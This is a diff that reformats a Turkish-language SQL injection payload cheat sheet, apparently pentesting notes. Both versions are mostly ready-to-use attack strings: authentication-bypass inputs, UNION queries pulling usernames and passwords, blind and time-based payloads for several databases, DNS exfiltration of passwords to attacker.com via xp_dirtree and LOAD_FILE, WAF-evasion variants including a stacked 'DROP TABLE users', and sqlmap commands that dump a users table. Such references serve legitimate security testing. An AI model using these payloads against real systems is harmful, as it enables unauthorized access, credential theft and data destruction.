@@ -1,198 +1,130 @@
-**SQL Injection**
+## SQL Injection
 
+SQL Injection, kullanıcı girdisinin SQL sorgusuna zararlı şekilde eklenmesi sonucu sorgu mantığının değiştirilmesiyle oluşan bir güvenlik açığıdır.
 
+---
 
-Kullanıcı girdisinin SQL sorgusuna zararlı bir kod eklenmesi sonucu, sorgu mantığının değiştirilebilmesidir.
+## Tespit (Error-based)
 
+* `'`
+* `"`
+* `'--`
+* `' OR '1'='1`
+* `' OR 1=1--`
+* `admin'--`
 
+---
 
-**Tespit (Error-based)**
+## Authentication Bypass
 
+Login form username alanı:
 
+* `admin' --`
+* `admin' OR '1'='1`
+* `' OR 1=1--`
+* `' OR ''='`
 
-sql'
+---
 
-"
+## Union-Based (Veri Çekme)
 
-'--
+Kolon sayısı tespiti:
 
-' OR '1'='1
+* `' ORDER BY 1--`
+* `' ORDER BY 2--`
+* `' ORDER BY 3--`
 
-' OR 1=1--
+(Hata alınan sayıdan bir önceki kolon sayıdır)
 
-admin'--
+Veri çekme:
 
+* `' UNION SELECT NULL,NULL,NULL--`
+* `' UNION SELECT username,password,NULL FROM users--`
 
+MySQL bilgi toplama:
 
-**Authentication Bypass**
+* `' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--`
+* `' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--`
 
+---
 
+## Boolean-Based Blind SQLi
 
-sql-- Login formunda kullanıcı adı alanına:
+* `' AND 1=1--`
+* `' AND 1=2--`
 
-admin' --
+Veri çıkarma (karakter bazlı):
 
-admin' OR '1'='1
+* `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--`
 
-' OR 1=1 LIMIT 1--
+---
 
-' OR ''='
+## Time-Based Blind SQLi
 
+MySQL:
 
+* `' AND SLEEP(5)--`
+* `' AND IF(1=1,SLEEP(5),0)--`
 
-**Union-Based (veri çekme)**
+MSSQL:
 
+* `'; WAITFOR DELAY '0:0:5'--`
 
+PostgreSQL:
 
-sql-- Önce kolon sayısını bul
+* `'; SELECT pg_sleep(5)--`
 
-' ORDER BY 1--
+Oracle:
 
-' ORDER BY 2--
+* `' AND DBMS_LOCK.SLEEP(5)--`
 
-' ORDER BY 3--   -- Hata verdiğinde bir önceki kolon sayısıdır
+---
 
+## Out-of-Band (OOB) Exfiltration
 
+MSSQL DNS tabanlı:
 
-\-- Sonra veri çek
+* `'; EXEC master..xp_dirtree '\\'+(SELECT password FROM users)+'.attacker.com\a'--`
 
-' UNION SELECT NULL,NULL,NULL--
+MySQL (yetki gerekebilir):
 
-' UNION SELECT username,password,NULL FROM users--
+* `' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))--`
 
+---
 
+## WAF Bypass Teknikleri
 
-\-- MySQL: veritabanı bilgisi toplama
+* `/**/SELECT/**/`
+* `'SeLeCt`
+* `%27%20OR%201=1--`
+* `'; DROP TABLE users;--` *(stacked query destekleniyorsa)*
+* `UN/**/ION SEL/**/ECT`
 
-' UNION SELECT table\_name,NULL,NULL FROM information\_schema.tables--
+---
 
-' UNION SELECT column\_name,NULL,NULL FROM information\_schema.columns WHERE table\_name='users'--
+## Test Araçları
 
+sqlmap:
 
+* `sqlmap -u "http://target.com/page?id=1" --dbs`
+* `sqlmap -u "http://target.com/page?id=1" -D dbname --tables`
+* `sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump`
 
-**Blind SQLi (Boolean-based)**
+Burp Suite:
 
+* Repeater ile manuel test
 
+---
 
-sql' AND 1=1--    -- True ise normal sayfa döner
+## Tespit Stratejisi
 
-' AND 1=2--    -- False ise farklı/boş sayfa döner
+1. `'` veya `"` gönder
+2. Hata dönüyorsa SQLi ihtimali
+3. Boolean test:
 
+   * `AND 1=1`
+   * `AND 1=2`
+4. Fark yoksa time-based test:
 
-
-\-- Veri çıkarma örneği (karakter karakter)
-
-' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
-
-
-
-**Time-based Blind SQLi**
-
-
-
-sql-- MySQL
-
-' AND SLEEP(5)--
-
-' OR IF(1=1,SLEEP(5),0)--
-
-
-
-\-- MSSQL
-
-'; WAITFOR DELAY '0:0:5'--
-
-
-
-\-- PostgreSQL
-
-'; SELECT pg\_sleep(5)--
-
-
-
-\-- Oracle
-
-' AND 1=1 AND DBMS\_LOCK.SLEEP(5)--
-
-
-
-Out-of-Band (OOB) — DNS/HTTP exfiltration
-
-
-
-sql-- MSSQL ile DNS üzerinden veri sızdırma
-
-'; EXEC master..xp\_dirtree '\\\\'+(SELECT password FROM users)+'.attacker.com\\a'--
-
-
-
-\-- MySQL ile (yetki gerekir)
-
-' UNION SELECT LOAD\_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\a'))--
-
-
-
-**WAF Bypass Teknikleri**
-
-
-
-sql-- Yorum satırı ile boşluk yerine
-
-/\*\*/UNION/\*\*/SELECT/\*\*/
-
-
-
-\-- Case değiştirme
-
-' UnIoN SeLeCt
-
-
-
-\-- Encode
-
-%27%20OR%201=1--
-
-
-
-\-- Çift sorgu (stacked queries - destekleniyorsa)
-
-'; DROP TABLE users;--
-
-
-
-**Test Araçları**
-
-
-
-*sqlmap — otomatik tespit ve exploit* 
-
-
-
-*bash  sqlmap -u "http://target.com/page?id=1" --dbs*
-
-&#x20; *sqlmap -u "http://target.com/page?id=1" -D dbname --tables*
-
-&#x20; *sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump*
-
-
-
-*Burp Suite (manuel test için Repeater)*
-
-
-
-
-
-**Tespit Stratejisi**
-
-
-
-
-
-*Her parametreye ' ve " gönderdim, hata mesajı (DB error) gelirse SQLi şüphesi var*
-
-*Hata yoksa boolean-based denemek gerekebilir. (1=1 vs 1=2 farkına bak)*
-
-*Hâlâ farksızsa time-based deneyelim (SLEEP(5))*
-
-*Confirm ettikten sonra sqlmap ile otomatikleştirmeye geçilebilir.*
-
+   * `SLEEP(5)`
+5. Doğrulandıktan sonra sqlmap ile otomasyon
